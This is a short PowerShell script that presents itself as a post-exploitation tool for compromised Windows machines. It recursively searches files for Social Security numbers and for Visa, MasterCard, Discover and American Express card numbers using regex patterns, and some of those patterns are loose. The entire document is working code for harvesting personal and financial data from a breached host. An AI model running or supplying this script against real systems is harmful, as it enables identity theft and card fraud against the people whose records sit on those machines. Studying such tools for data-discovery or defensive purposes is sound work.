# This post script was written to search for sensitive information from compromised windows machines, intended for demonstrative purposes.

function Get-SSN 
{
# This will search for Social Security Numbers
Get-ChildItem  -rec | ?{ findstr.exe /mprc:. $_.FullName } | select-string "[0-9]{9}" , "[0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}"

}

function Get-CCards 
{
# This will search for Credit Card data: Discover, MasterCard, Visa
Get-ChildItem  -rec | ?{ findstr.exe /mprc:. $_.FullName } | select-string "[456][0-9]{3}[-| ][0-9]{4}[-| ][0-9]{4}[-| ][0-9]{4}" 

Get-ChildItem  -rec | ?{ findstr.exe /mprc:. $_.FullName } | select-string "[456][0-9]{15}"
}

function Get-Amex
{
#American Express 
Get-childitem -rec | ?{ findstr.exe /mprc:. $_.FullName } | select-string "3[47][0-9]{4}[-| ][0-9]{6}[-| ][0-9]{5}"

Get-childitem -rec | ?{ findstr.exe /mprc:. $_.FullName } | select-string "3[47][0-9]{2}[-| ][0-9]{4}[-| ][0-9]{4}[-| ][0-9]{3}"

Get-ChildItem -rec | ?{ findstr.exe /mprc:. $_.FullName } | select-string "3[47][0-9]{13}","3[47][0-9]{2}[-| ][0-9]{6}[-| ][0-9]{5}"
}

